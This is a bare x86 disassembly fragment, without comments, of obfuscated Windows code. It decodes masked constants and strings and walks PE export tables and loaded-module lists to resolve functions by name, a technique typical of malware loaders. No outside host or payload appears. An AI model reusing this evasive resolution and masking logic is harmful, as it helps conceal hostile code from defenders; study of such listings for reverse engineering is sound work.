  42210f:	lea    edi,[edi+ebx*1+0x3272fa]
  422116:	mov    DWORD PTR [ebp-0x10],edi
  422119:	mov    edi,DWORD PTR [ebp-0x1c]
  42211c:	mov    ebx,DWORD PTR [ebp-0x14]
  42211f:	xor    edi,ecx
  422121:	lea    edi,[edi+ebx*1+0x3272fa]
  422128:	mov    DWORD PTR [ebp-0x14],edi
  42212b:	mov    edi,DWORD PTR [ebp-0x24]
  42212e:	mov    ebx,DWORD PTR [ebp-0x10]
  422131:	mov    di,WORD PTR [ebx+edi*2]
  422135:	mov    WORD PTR [ebp+0x8],di
  422139:	mov    edi,DWORD PTR [ebp-0x28]
  42213c:	mov    ebx,DWORD PTR [ebp-0x14]
  42213f:	mov    di,WORD PTR [ebx+edi*2]
  422143:	mov    WORD PTR [ebp-0x4],di
  422147:	mov    edi,DWORD PTR [ebp-0xc]
  42214a:	mov    bx,WORD PTR [ebp+0x8]
  42214e:	xor    edi,esi
  422150:	add    edi,eax
  422152:	cmp    bx,di
  422155:	jne    0x42206b
  42215b:	mov    eax,DWORD PTR [ebp-0x18]
  42215e:	mov    esi,DWORD PTR [ebp-0xc]
  422161:	xor    eax,ecx
  422163:	add    eax,edx
  422165:	imul   eax,esi
  422168:	mov    DWORD PTR [ebp-0xc],eax
  42216b:	jmp    0x42217f
  42216d:	mov    eax,DWORD PTR [ebp-0xc]
  422170:	mov    esi,DWORD PTR [ebp-0x18]
  422173:	xor    eax,ecx
  422175:	lea    eax,[eax+esi*1+0x3272fa]
  42217c:	mov    DWORD PTR [ebp-0x18],eax
  42217f:	mov    eax,DWORD PTR [ebp-0x24]
  422182:	sub    eax,edx
  422184:	xor    eax,ecx
  422186:	mov    DWORD PTR [ebp-0x30],eax
  422189:	mov    eax,DWORD PTR [ebp-0x28]
  42218c:	sub    eax,edx
  42218e:	xor    eax,ecx
  422190:	mov    DWORD PTR [ebp-0x34],eax
  422193:	mov    eax,DWORD PTR [ebp-0x34]
  422196:	mov    esi,DWORD PTR [ebp-0x1c]
  422199:	xor    esi,ecx
  42219b:	add    esi,edx
  42219d:	xor    eax,ecx
  42219f:	add    eax,0x3272fa
  4221a4:	imul   esi,eax
  4221a7:	mov    eax,DWORD PTR [ebp-0x14]
  4221aa:	movzx  eax,WORD PTR [esi+eax*1]
  4221ae:	mov    esi,DWORD PTR [ebp-0x30]
  4221b1:	mov    edi,DWORD PTR [ebp-0x1c]
  4221b4:	xor    esi,ecx
  4221b6:	add    esi,edx
  4221b8:	xor    edi,ecx
  4221ba:	add    edi,edx
  4221bc:	imul   edi,esi
  4221bf:	mov    esi,DWORD PTR [ebp-0x10]
  4221c2:	movzx  esi,WORD PTR [edi+esi*1]
  4221c6:	sub    eax,edx
  4221c8:	sub    esi,edx
  4221ca:	xor    eax,ecx
  4221cc:	xor    esi,ecx
  4221ce:	cmp    esi,eax
  4221d0:	jne    0x4221fb
  4221d2:	mov    eax,DWORD PTR [ebp-0x30]
  4221d5:	mov    esi,DWORD PTR [ebp-0x1c]
  4221d8:	xor    eax,ecx
  4221da:	add    eax,0x3272fa
  4221df:	xor    esi,ecx
  4221e1:	add    esi,edx
  4221e3:	imul   esi,eax
  4221e6:	mov    eax,DWORD PTR [ebp-0x10]
  4221e9:	movzx  eax,WORD PTR [esi+eax*1]
  4221ed:	mov    esi,DWORD PTR [ebp-0xc]
  4221f0:	sub    eax,edx
  4221f2:	xor    eax,ecx
  4221f4:	cmp    eax,esi
  4221f6:	mov    eax,DWORD PTR [ebp-0xc]
  4221f9:	je     0x4221fe
  4221fb:	mov    eax,DWORD PTR [ebp-0x18]
  4221fe:	pop    edi
  4221ff:	xor    eax,ecx
  422201:	pop    esi
  422202:	add    eax,edx
  422204:	pop    ebx
  422205:	leave  
  422206:	ret    0x8
  422209:	push   ebp
  42220a:	mov    ebp,esp
  42220c:	push   ecx
  42220d:	mov    cx,WORD PTR [eax]
  422210:	push   esi
  422211:	mov    esi,0x3b5f
  422216:	sub    cx,si
  422219:	mov    esi,0x8a9d
  42221e:	xor    cx,si
  422221:	mov    esi,0x4e3c
  422226:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42222d:	mov    edx,0xf89c85b5
  422232:	cmp    cx,si
  422235:	je     0x422294
  422237:	push   ebx
  422238:	push   edi
  422239:	movzx  ecx,cx
  42223c:	mov    edi,0xffcd8d06
  422241:	mov    esi,0x75108b3
  422246:	mov    ebx,0x4e60
  42224b:	cmp    cx,bx
  42224e:	jne    0x422253
  422250:	mov    DWORD PTR [ebp-0x4],edx
  422253:	lea    edx,[edi+0x1]
  422256:	xor    edx,esi
  422258:	mov    edi,edx
  42225a:	xor    edi,esi
  42225c:	mov    cx,WORD PTR [eax+edi*2+0x64e5f4]
  422264:	mov    ebx,0x3b5f
  422269:	sub    cx,bx
  42226c:	mov    ebx,0x8a9d
  422271:	xor    cx,bx
  422274:	mov    ebx,0x4e3c
  422279:	cmp    cx,bx
  42227c:	jne    0x422246
  42227e:	mov    ecx,DWORD PTR [ebp-0x4]
  422281:	pop    edi
  422282:	pop    ebx
  422283:	cmp    ecx,0xf89c85b6
  422289:	je     0x422294
  42228b:	xor    ecx,esi
  42228d:	lea    eax,[eax+ecx*2+0x64e5f6]
  422294:	pop    esi
  422295:	leave  
  422296:	ret    
  422297:	push   ebp
  422298:	mov    ebp,esp
  42229a:	push   ecx
  42229b:	push   esi
  42229c:	push   edi
  42229d:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  4222a4:	mov    esi,0xf89c85b5
  4222a9:	call   0x422209
  4222ae:	mov    edi,eax
  4222b0:	mov    al,BYTE PTR [edi]
  4222b2:	sub    al,0x6
  4222b4:	xor    al,0x81
  4222b6:	cmp    al,0x7b
  4222b8:	je     0x42231b
  4222ba:	mov    eax,edi
  4222bc:	mov    edx,0xffcd8d06
  4222c1:	mov    ecx,0x75108b3
  4222c6:	push   ebx
  4222c7:	mov    ax,WORD PTR [eax]
  4222ca:	mov    ebx,0x3b5f
  4222cf:	sub    ax,bx
  4222d2:	mov    ebx,0x8a9d
  4222d7:	xor    ax,bx
  4222da:	mov    ebx,0x4e52
  4222df:	cmp    ax,bx
  4222e2:	jne    0x4222e7
  4222e4:	mov    DWORD PTR [ebp-0x4],esi
  4222e7:	lea    esi,[edx+0x1]
  4222ea:	xor    esi,ecx
  4222ec:	mov    edx,esi
  4222ee:	xor    edx,ecx
  4222f0:	lea    eax,[edi+edx*2+0x64e5f4]
  4222f7:	mov    bl,BYTE PTR [eax]
  4222f9:	sub    bl,0x6
  4222fc:	xor    bl,0x81
  4222ff:	cmp    bl,0x7b
  422302:	jne    0x4222c7
  422304:	mov    eax,DWORD PTR [ebp-0x4]
  422307:	pop    ebx
  422308:	cmp    eax,0xf89c85b6
  42230d:	je     0x42231b
  42230f:	xor    eax,ecx
  422311:	xor    ecx,ecx
  422313:	mov    WORD PTR [edi+eax*2+0x64e5f4],cx
  42231b:	mov    eax,edi
  42231d:	pop    edi
  42231e:	pop    esi
  42231f:	leave  
  422320:	ret    
  422321:	push   ebp
  422322:	mov    ebp,esp
  422324:	push   ecx
  422325:	push   esi
  422326:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42232d:	mov    esi,0xf89c85b5
  422332:	call   0x422209
  422337:	mov    cx,WORD PTR [eax]
  42233a:	mov    edx,0x3b5f
  42233f:	sub    cx,dx
  422342:	mov    edx,0x8a9d
  422347:	xor    cx,dx
  42234a:	mov    edx,0x4e3c
  42234f:	cmp    cx,dx
  422352:	je     0x4223ab
  422354:	push   ebx
  422355:	push   edi
  422356:	movzx  ecx,cx
  422359:	mov    edx,0xffcd8d06
  42235e:	mov    edi,0x75108b3
  422363:	mov    ebx,0x4e52
  422368:	cmp    cx,bx
  42236b:	jne    0x422370
  42236d:	mov    DWORD PTR [ebp-0x4],esi
  422370:	lea    esi,[edx+0x1]
  422373:	xor    esi,edi
  422375:	mov    edx,esi
  422377:	xor    edx,edi
  422379:	mov    cx,WORD PTR [eax+edx*2+0x64e5f4]
  422381:	mov    ebx,0x3b5f
  422386:	sub    cx,bx
  422389:	mov    ebx,0x8a9d
  42238e:	xor    cx,bx
  422391:	mov    ebx,0x4e3c
  422396:	cmp    cx,bx
  422399:	jne    0x422363
  42239b:	cmp    DWORD PTR [ebp-0x4],0xf89c85b6
  4223a2:	pop    edi
  4223a3:	pop    ebx
  4223a4:	je     0x4223ab
  4223a6:	xor    eax,eax
  4223a8:	inc    eax
  4223a9:	jmp    0x4223ad
  4223ab:	xor    eax,eax
  4223ad:	pop    esi
  4223ae:	leave  
  4223af:	ret    
  4223b0:	push   ebp
  4223b1:	mov    ebp,esp
  4223b3:	push   ecx
  4223b4:	mov    eax,DWORD PTR [ebp+0x8]
  4223b7:	movzx  ecx,WORD PTR [eax]
  4223ba:	push   esi
  4223bb:	lea    eax,[ecx-0x3b5f]
  4223c1:	mov    esi,0x8a9d
  4223c6:	push   edi
  4223c7:	xor    eax,esi
  4223c9:	mov    edi,0x4e3c
  4223ce:	mov    DWORD PTR [ebp-0x4],edx
  4223d1:	cmp    ax,di
  4223d4:	je     0x422401
  4223d6:	mov    eax,DWORD PTR [ebp+0x8]
  4223d9:	sub    eax,edx
  4223db:	mov    DWORD PTR [ebp+0x8],eax
  4223de:	jmp    0x4223e3
  4223e0:	mov    eax,DWORD PTR [ebp+0x8]
  4223e3:	mov    WORD PTR [edx],cx
  4223e6:	add    edx,0x2
  4223e9:	movzx  edi,WORD PTR [eax+edx*1]
  4223ed:	mov    ecx,edi
  4223ef:	add    edi,0xffffc4a1
  4223f5:	xor    edi,esi
  4223f7:	mov    eax,0x4e3c
  4223fc:	cmp    di,ax
  4223ff:	jne    0x4223e0
  422401:	xor    eax,eax
  422403:	pop    edi
  422404:	mov    WORD PTR [edx],ax
  422407:	mov    eax,DWORD PTR [ebp-0x4]
  42240a:	pop    esi
  42240b:	leave  
  42240c:	ret    0x4
  42240f:	push   ebp
  422410:	mov    ebp,esp
  422412:	sub    esp,0x18
  422415:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  42241c:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  422423:	mov    ecx,DWORD PTR [ebp-0x8]
  422426:	push   esi
  422427:	mov    eax,0x75108b3
  42242c:	xor    ecx,eax
  42242e:	mov    esi,0x3272fa
  422433:	add    ecx,esi
  422435:	mov    DWORD PTR [ebp-0x4],ecx
  422438:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42243f:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  422446:	push   edi
  422447:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  42244e:	jmp    0x4224ef
  422453:	mov    ecx,DWORD PTR [ebp-0x4]
  422456:	mov    edx,DWORD PTR [ebp+0x10]
  422459:	sub    edx,ecx
  42245b:	mov    ecx,DWORD PTR [ebp-0xc]
  42245e:	xor    ecx,eax
  422460:	add    ecx,esi
  422462:	cmp    edx,ecx
  422464:	jbe    0x422481
  422466:	mov    edx,DWORD PTR [ebp-0x4]
  422469:	add    edx,DWORD PTR [ebp+0x8]
  42246c:	mov    ecx,DWORD PTR [ebp-0x4]
  42246f:	add    ecx,DWORD PTR [ebp+0xc]
  422472:	mov    edi,DWORD PTR [ecx]
  422474:	mov    DWORD PTR [edx],edi
  422476:	mov    ecx,DWORD PTR [ecx+0x4]
  422479:	mov    DWORD PTR [edx+0x4],ecx
  42247c:	mov    ecx,DWORD PTR [ebp-0xc]
  42247f:	jmp    0x4224ce
  422481:	mov    ecx,DWORD PTR [ebp-0x4]
  422484:	mov    edx,DWORD PTR [ebp+0x10]
  422487:	sub    edx,ecx
  422489:	mov    ecx,DWORD PTR [ebp-0x10]
  42248c:	xor    ecx,eax
  42248e:	add    ecx,esi
  422490:	cmp    edx,ecx
  422492:	mov    ecx,DWORD PTR [ebp-0x4]
  422495:	jbe    0x4224a9
  422497:	add    ecx,DWORD PTR [ebp+0x8]
  42249a:	mov    edx,DWORD PTR [ebp-0x4]
  42249d:	add    edx,DWORD PTR [ebp+0xc]
  4224a0:	mov    edx,DWORD PTR [edx]
  4224a2:	mov    DWORD PTR [ecx],edx
  4224a4:	mov    ecx,DWORD PTR [ebp-0x10]
  4224a7:	jmp    0x4224ce
  4224a9:	mov    edx,DWORD PTR [ebp+0x10]
  4224ac:	sub    edx,ecx
  4224ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4224b1:	xor    ecx,eax
  4224b3:	add    ecx,esi
  4224b5:	cmp    edx,ecx
  4224b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4224ba:	jbe    0x4224df
  4224bc:	add    ecx,DWORD PTR [ebp+0x8]
  4224bf:	mov    edx,DWORD PTR [ebp-0x4]
  4224c2:	add    edx,DWORD PTR [ebp+0xc]
  4224c5:	mov    dx,WORD PTR [edx]
  4224c8:	mov    WORD PTR [ecx],dx
  4224cb:	mov    ecx,DWORD PTR [ebp-0x14]
  4224ce:	mov    edx,DWORD PTR [ebp-0x4]
  4224d1:	xor    ecx,eax
  4224d3:	lea    ecx,[ecx+edx*1+0x3272fa]
  4224da:	mov    DWORD PTR [ebp-0x4],ecx
  4224dd:	jmp    0x4224ef
  4224df:	add    ecx,DWORD PTR [ebp+0x8]
  4224e2:	mov    edx,DWORD PTR [ebp-0x4]
  4224e5:	add    edx,DWORD PTR [ebp+0xc]
  4224e8:	mov    dl,BYTE PTR [edx]
  4224ea:	mov    BYTE PTR [ecx],dl
  4224ec:	inc    DWORD PTR [ebp-0x4]
  4224ef:	mov    ecx,DWORD PTR [ebp-0x18]
  4224f2:	mov    edx,DWORD PTR [ebp+0x10]
  4224f5:	xor    ecx,eax
  4224f7:	add    ecx,esi
  4224f9:	imul   ecx,edx
  4224fc:	mov    edx,DWORD PTR [ebp-0x8]
  4224ff:	mov    edi,DWORD PTR [ebp-0x4]
  422502:	xor    edx,eax
  422504:	lea    edx,[edx+edi*1+0x3272fa]
  42250b:	cmp    edx,ecx
  42250d:	jb     0x422453
  422513:	pop    edi
  422514:	pop    esi
  422515:	leave  
  422516:	ret    0xc
  422519:	push   ebp
  42251a:	mov    ebp,esp
  42251c:	sub    esp,0xc
  42251f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  422526:	push   esi
  422527:	mov    esi,eax
  422529:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  422530:	mov    edx,DWORD PTR [ebp-0x4]
  422533:	mov    eax,0x75108b3
  422538:	xor    edx,eax
  42253a:	mov    ecx,0x3272fa
  42253f:	add    edx,ecx
  422541:	cmp    esi,edx
  422543:	je     0x422585
  422545:	push   ebx
  422546:	push   edi
  422547:	mov    edx,DWORD PTR [ebp-0x8]
  42254a:	mov    ebx,DWORD PTR [ebp+0x8]
  42254d:	xor    edx,eax
  42254f:	mov    edi,0xffcd8d06
  422554:	sub    edi,edx
  422556:	add    esi,edi
  422558:	lea    edx,[esi-0x3272fa]
  42255e:	xor    edx,eax
  422560:	mov    DWORD PTR [ebp-0xc],edx
  422563:	mov    edx,DWORD PTR [ebp-0x4]
  422566:	mov    edi,DWORD PTR [ebp-0xc]
  422569:	xor    dl,0xb3
  42256c:	sub    dl,0x6
  42256f:	xor    edi,eax
  422571:	mov    BYTE PTR [edi+ebx*1+0x3272fa],dl
  422578:	mov    edx,DWORD PTR [ebp-0x4]
  42257b:	xor    edx,eax
  42257d:	add    edx,ecx
  42257f:	cmp    esi,edx
  422581:	jne    0x422547
  422583:	pop    edi
  422584:	pop    ebx
  422585:	pop    esi
  422586:	leave  
  422587:	ret    0x4
  42258a:	push   ebp
  42258b:	mov    ebp,esp
  42258d:	sub    esp,0x21c
  422593:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42259a:	mov    DWORD PTR [ebp-0x14],0xf89c85b4
  4225a1:	mov    eax,DWORD PTR [ebp+0x10]
  4225a4:	mov    eax,DWORD PTR [ebp-0x4]
  4225a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4225aa:	push   esi
  4225ab:	push   edi
  4225ac:	mov    edi,0x75108b3
  4225b1:	xor    eax,edi
  4225b3:	mov    esi,0x3272fa
  4225b8:	add    eax,esi
  4225ba:	cmp    eax,ecx
  4225bc:	mov    eax,DWORD PTR [ebp-0x4]
  4225bf:	jne    0x4225ca
  4225c1:	xor    eax,edi
  4225c3:	add    eax,esi
  4225c5:	jmp    0x422676
  4225ca:	mov    ecx,DWORD PTR [ebp+0xc]
  4225cd:	xor    eax,edi
  4225cf:	add    eax,esi
  4225d1:	cmp    eax,ecx
  4225d3:	jne    0x4225da
  4225d5:	mov    eax,DWORD PTR [ebp-0x4]
  4225d8:	jmp    0x4225c1
  4225da:	lea    eax,[ebp-0x21c]
  4225e0:	mov    DWORD PTR [ebp-0x8],eax
  4225e3:	mov    eax,DWORD PTR [ebp+0xc]
  4225e6:	mov    DWORD PTR [ebp-0x10],eax
  4225e9:	mov    eax,DWORD PTR [ebp-0x4]
  4225ec:	xor    eax,edi
  4225ee:	add    eax,esi
  4225f0:	mov    DWORD PTR [ebp+0x10],eax
  4225f3:	mov    eax,DWORD PTR [ebp+0xc]
  4225f6:	push   ebx
  4225f7:	call   0x422321
  4225fc:	mov    ebx,eax
  4225fe:	mov    eax,DWORD PTR [ebp+0x8]
  422601:	mov    eax,DWORD PTR [eax+0x14]
  422604:	jmp    0x42265e
  422606:	mov    eax,DWORD PTR [ebp+0xc]
  422609:	sub    eax,0x8
  42260c:	mov    DWORD PTR [ebp-0xc],eax
  42260f:	mov    eax,DWORD PTR [ebp-0xc]
  422612:	mov    eax,DWORD PTR [eax+0x28]
  422615:	call   0x422209
  42261a:	mov    DWORD PTR [ebp+0x10],eax
  42261d:	push   DWORD PTR [ebp+0x10]
  422620:	mov    edx,DWORD PTR [ebp-0x8]
  422623:	call   0x4223b0
  422628:	mov    eax,DWORD PTR [ebp-0x4]
  42262b:	xor    eax,edi
  42262d:	add    eax,esi
  42262f:	cmp    eax,ebx
  422631:	jne    0x42263b
  422633:	mov    eax,DWORD PTR [ebp-0x8]
  422636:	call   0x422297
  42263b:	mov    eax,DWORD PTR [ebp-0x14]
  42263e:	xor    eax,edi
  422640:	add    eax,esi
  422642:	push   eax
  422643:	push   DWORD PTR [ebp-0x10]
  422646:	mov    eax,DWORD PTR [ebp-0x8]
  422649:	call   0x421fc3
  42264e:	mov    ecx,DWORD PTR [ebp-0x4]
  422651:	xor    ecx,edi
  422653:	add    ecx,esi
  422655:	cmp    eax,ecx
  422657:	je     0x42267c
  422659:	mov    eax,DWORD PTR [ebp+0xc]
  42265c:	mov    eax,DWORD PTR [eax]
  42265e:	mov    DWORD PTR [ebp+0xc],eax
  422661:	mov    eax,DWORD PTR [ebp+0x8]
  422664:	mov    ecx,DWORD PTR [ebp+0xc]
  422667:	add    eax,0x14
  42266a:	cmp    ecx,eax
  42266c:	jne    0x422606
  42266e:	mov    eax,DWORD PTR [ebp-0x4]
  422671:	xor    eax,edi
  422673:	add    eax,esi
  422675:	pop    ebx
  422676:	pop    edi
  422677:	pop    esi
  422678:	leave  
  422679:	ret    0xc
  42267c:	mov    eax,DWORD PTR [ebp-0xc]
  42267f:	mov    eax,DWORD PTR [eax+0x18]
  422682:	jmp    0x422675
  422684:	push   ebp
  422685:	mov    ebp,esp
  422687:	mov    eax,DWORD PTR [ebp+0xc]
  42268a:	sub    esp,0x10
  42268d:	cmp    DWORD PTR [ebp+0x8],0x0
  422691:	push   ebx
  422692:	push   esi
  422693:	push   edi
  422694:	je     0x422749
  42269a:	test   eax,eax
  42269c:	je     0x422749
  4226a2:	movzx  eax,WORD PTR [eax+0x20]
  4226a6:	mov    ecx,eax
  4226a8:	mov    DWORD PTR [ebp-0x10],eax
  4226ab:	xor    edx,edx
  4226ad:	and    DWORD PTR [ebp-0x8],edx
  4226b0:	mov    eax,0x8a9d
  4226b5:	xor    ecx,eax
  4226b7:	add    ecx,0x3b5f
  4226bd:	mov    DWORD PTR [ebp-0xc],ecx
  4226c0:	and    DWORD PTR [ebp-0x4],0x0
  4226c4:	xor    ecx,ecx
  4226c6:	push   0x7d
  4226c8:	pop    edi
  4226c9:	cmp    cx,WORD PTR [ebp-0xc]
  4226cd:	jae    0x422733
  4226cf:	lea    esi,[edx-0x3b5f]
  4226d5:	xor    esi,eax
  4226d7:	movzx  ecx,WORD PTR [ebp-0x4]
  4226db:	mov    ebx,DWORD PTR [ebp+0xc]
  4226de:	lea    ecx,[ebx+ecx*4]
  4226e1:	cmp    WORD PTR [ecx+0x2],si
  4226e5:	jne    0x42271e
  4226e7:	movzx  ecx,WORD PTR [ecx]
  4226ea:	mov    edi,0x4e3c
  4226ef:	cmp    cx,di
  4226f2:	jne    0x422700
  4226f4:	mov    ebx,DWORD PTR [ebp+0x8]
  4226f7:	movzx  edi,dx
  4226fa:	cmp    BYTE PTR [edi+ebx*1],0x0
  4226fe:	je     0x42272d
  422700:	mov    ebx,DWORD PTR [ebp+0x8]
  422703:	movzx  edi,dx
  422706:	movsx  di,BYTE PTR [edi+ebx*1]
  42270b:	mov    ebx,0x3b5f
  422710:	sub    di,bx
  422713:	xor    di,ax
  422716:	cmp    cx,di
  422719:	je     0x42272d
  42271b:	push   0x7b
  42271d:	pop    edi
  42271e:	inc    DWORD PTR [ebp-0x4]
  422721:	mov    cx,WORD PTR [ebp-0xc]
  422725:	cmp    WORD PTR [ebp-0x4],cx
  422729:	jb     0x4226d7
  42272b:	jmp    0x422733
  42272d:	inc    DWORD PTR [ebp-0x8]
  422730:	push   0x7a
  422732:	pop    edi
  422733:	mov    esi,DWORD PTR [ebp+0x8]
  422736:	movzx  ecx,dx
  422739:	cmp    BYTE PTR [ecx+esi*1],0x0
  42273d:	je     0x422752
  42273f:	inc    edx
  422740:	cmp    edi,0x7b
  422743:	jne    0x4226c0
  422749:	xor    eax,eax
  42274b:	pop    edi
  42274c:	pop    esi
  42274d:	pop    ebx
  42274e:	leave  
  42274f:	ret    0x8
  422752:	mov    ecx,DWORD PTR [ebp-0x8]
  422755:	add    ecx,0xffffc4a1
  42275b:	xor    cx,ax
  42275e:	xor    eax,eax
  422760:	cmp    cx,WORD PTR [ebp-0x10]
  422764:	sete   al
  422767:	jmp    0x42274b
  422769:	push   ebp
  42276a:	mov    ebp,esp
  42276c:	sub    esp,0x50
  42276f:	push   edi
  422770:	mov    edi,eax
  422772:	mov    eax,DWORD PTR [edi+0x1a8]
  422778:	cmp    DWORD PTR [eax],0x0
  42277b:	jne    0x422784
  42277d:	xor    eax,eax
  42277f:	jmp    0x4228b5
  422784:	push   DWORD PTR [ebp+0x8]
  422787:	push   0x2c
  422789:	pop    eax
  42278a:	call   0x422519
  42278f:	mov    edx,DWORD PTR [edi+0x1ac]
  422795:	lea    eax,[edi+0x22]
  422798:	mov    DWORD PTR [ebp-0x4c],eax
  42279b:	lea    eax,[edi+0x44]
  42279e:	mov    DWORD PTR [ebp-0x48],eax
  4227a1:	lea    eax,[edi+0x66]
  4227a4:	mov    DWORD PTR [ebp-0x44],eax
  4227a7:	lea    eax,[edi+0x88]
  4227ad:	mov    DWORD PTR [ebp-0x40],eax
  4227b0:	lea    eax,[edi+0xaa]
  4227b6:	mov    DWORD PTR [ebp-0x3c],eax
  4227b9:	lea    eax,[edi+0xcc]
  4227bf:	mov    DWORD PTR [ebp-0x38],eax
  4227c2:	lea    eax,[edi+0xee]
  4227c8:	mov    DWORD PTR [ebp-0x34],eax
  4227cb:	lea    eax,[edi+0x110]
  4227d1:	mov    DWORD PTR [ebp-0x30],eax
  4227d4:	lea    eax,[edi+0x132]
  4227da:	mov    DWORD PTR [ebp-0x2c],eax
  4227dd:	lea    eax,[edi+0x154]
  4227e3:	push   edi
  4227e4:	mov    DWORD PTR [ebp-0x50],edi
  4227e7:	mov    DWORD PTR [ebp-0x28],eax
  4227ea:	call   0x4228e9
  4227ef:	push   eax
  4227f0:	mov    eax,DWORD PTR [edi+0x1a8]
  4227f6:	push   DWORD PTR [eax]
  4227f8:	call   0x42258a
  4227fd:	mov    DWORD PTR [ebp-0x10],eax
  422800:	test   eax,eax
  422802:	je     0x4228b5
  422808:	mov    ecx,DWORD PTR [eax+0x3c]
  42280b:	push   ebx
  42280c:	push   esi
  42280d:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  422811:	add    esi,eax
  422813:	mov    edi,DWORD PTR [esi+0x24]
  422816:	mov    ecx,DWORD PTR [esi+0x1c]
  422819:	mov    edx,DWORD PTR [esi+0x20]
  42281c:	mov    ebx,DWORD PTR [esi+0x18]
  42281f:	add    edi,eax
  422821:	mov    DWORD PTR [ebp-0x20],edi
  422824:	mov    edi,DWORD PTR [esi+0x14]
  422827:	add    ecx,eax
  422829:	add    edx,eax
  42282b:	mov    DWORD PTR [ebp-0xc],ecx
  42282e:	mov    DWORD PTR [ebp-0x1c],edx
  422831:	mov    DWORD PTR [ebp-0x8],edi
  422834:	cmp    edi,ebx
  422836:	ja     0x42283b
  422838:	mov    DWORD PTR [ebp-0x8],ebx
  42283b:	xor    ebx,ebx
  42283d:	mov    DWORD PTR [ebp-0x18],ebx
  422840:	cmp    DWORD PTR [ebp-0x8],ebx
  422843:	jbe    0x4228b3
  422845:	jmp    0x42284a
  422847:	mov    edx,DWORD PTR [ebp-0x1c]
  42284a:	mov    edi,DWORD PTR [ebp-0x20]
  42284d:	movzx  edi,WORD PTR [edi+ebx*2]
  422851:	cmp    ebx,DWORD PTR [esi+0x18]
  422854:	jae    0x4228b3
  422856:	cmp    edi,DWORD PTR [esi+0x14]
  422859:	jae    0x4228b3
  42285b:	mov    ebx,DWORD PTR [edx+ebx*4]
  42285e:	mov    edx,DWORD PTR [ebp+0x8]
  422861:	mov    edi,DWORD PTR [ecx+edi*4]
  422864:	mov    DWORD PTR [ebp-0x4],edx
  422867:	lea    edx,[ebp-0x50]
  42286a:	add    ebx,eax
  42286c:	add    edi,eax
  42286e:	sub    edx,DWORD PTR [ebp+0x8]
  422871:	mov    DWORD PTR [ebp-0x14],0xb
  422878:	mov    DWORD PTR [ebp-0x24],edx
  42287b:	mov    edx,DWORD PTR [ebp-0x4]
  42287e:	cmp    DWORD PTR [edx],0x0
  422881:	jne    0x42289e
  422883:	mov    eax,DWORD PTR [ebp-0x24]
  422886:	push   DWORD PTR [eax+edx*1]
  422889:	push   ebx
  42288a:	call   0x422684
  42288f:	mov    ecx,DWORD PTR [ebp-0xc]
  422892:	test   eax,eax
  422894:	je     0x42289b
  422896:	mov    eax,DWORD PTR [ebp-0x4]
  422899:	mov    DWORD PTR [eax],edi
  42289b:	mov    eax,DWORD PTR [ebp-0x10]
  42289e:	add    DWORD PTR [ebp-0x4],0x4
  4228a2:	dec    DWORD PTR [ebp-0x14]
  4228a5:	jne    0x42287b
  4228a7:	mov    ebx,DWORD PTR [ebp-0x18]
  4228aa:	inc    ebx
  4228ab:	mov    DWORD PTR [ebp-0x18],ebx
  4228ae:	cmp    ebx,DWORD PTR [ebp-0x8]
  4228b1:	jb     0x422847
  4228b3:	pop    esi
  4228b4:	pop    ebx
  4228b5:	pop    edi
  4228b6:	leave  
  4228b7:	ret    0x4
  4228ba:	push   ebp
  4228bb:	mov    ebp,esp
  4228bd:	mov    eax,DWORD PTR [ebp+0x8]
  4228c0:	push   esi
  4228c1:	push   DWORD PTR [eax+0x1e0]
  4228c7:	lea    esi,[eax+0x198]
  4228cd:	mov    eax,DWORD PTR [ebp+0x8]
  4228d0:	call   0x422769
  4228d5:	mov    ecx,DWORD PTR [esi]
  4228d7:	mov    DWORD PTR [ecx],eax
  4228d9:	mov    eax,DWORD PTR [esi]
  4228db:	xor    ecx,ecx
  4228dd:	cmp    DWORD PTR [eax],ecx
  4228df:	pop    esi
  4228e0:	setne  cl
  4228e3:	mov    eax,ecx
  4228e5:	pop    ebp
  4228e6:	ret    0x4
  4228e9:	mov    ecx,DWORD PTR [edi+0x188]
  4228ef:	push   ebx
  4228f0:	jmp    0x422905
  4228f2:	xor    eax,0x8a9d
  4228f7:	add    eax,0x3b5f
  4228fc:	mov    WORD PTR [ecx],ax
  4228ff:	add    ecx,0x2
  422902:	add    edx,0x2
  422905:	movzx  eax,WORD PTR [edx]
  422908:	mov    ebx,0x4e3c
  42290d:	cmp    ax,bx
  422910:	jne    0x4228f2
  422912:	xor    eax,eax
  422914:	mov    WORD PTR [ecx],ax
  422917:	mov    eax,DWORD PTR [edi+0x188]
  42291d:	pop    ebx
  42291e:	ret    
  42291f:	push   edi
  422920:	mov    edi,eax
  422922:	mov    eax,DWORD PTR [esi+0x188]
  422928:	shl    edi,0x6
  42292b:	add    eax,edi
  42292d:	jmp    0x422939
  42292f:	xor    cl,0x81
  422932:	add    cl,0x6
  422935:	mov    BYTE PTR [eax],cl
  422937:	inc    eax
  422938:	inc    edx
  422939:	mov    cl,BYTE PTR [edx]
  42293b:	cmp    cl,0x7b
  42293e:	jne    0x42292f
  422940:	mov    BYTE PTR [eax],0x0
  422943:	mov    eax,DWORD PTR [esi+0x188]
  422949:	add    eax,edi
  42294b:	pop    edi
  42294c:	ret    
  42294d:	push   ebp
  42294e:	mov    ebp,esp
  422950:	sub    esp,0x14
  422953:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42295a:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  422961:	mov    eax,DWORD PTR [ebx]
  422963:	mov    DWORD PTR [ebp-0x8],eax
  422966:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42296d:	push   esi
  42296e:	push   edi
  42296f:	mov    DWORD PTR [ebp-0x14],0xead71895
  422976:	mov    edi,DWORD PTR [ebp-0x4]
  422979:	mov    ecx,DWORD PTR [ebp-0x10]
  42297c:	mov    eax,0x75108b3
  422981:	xor    edi,eax
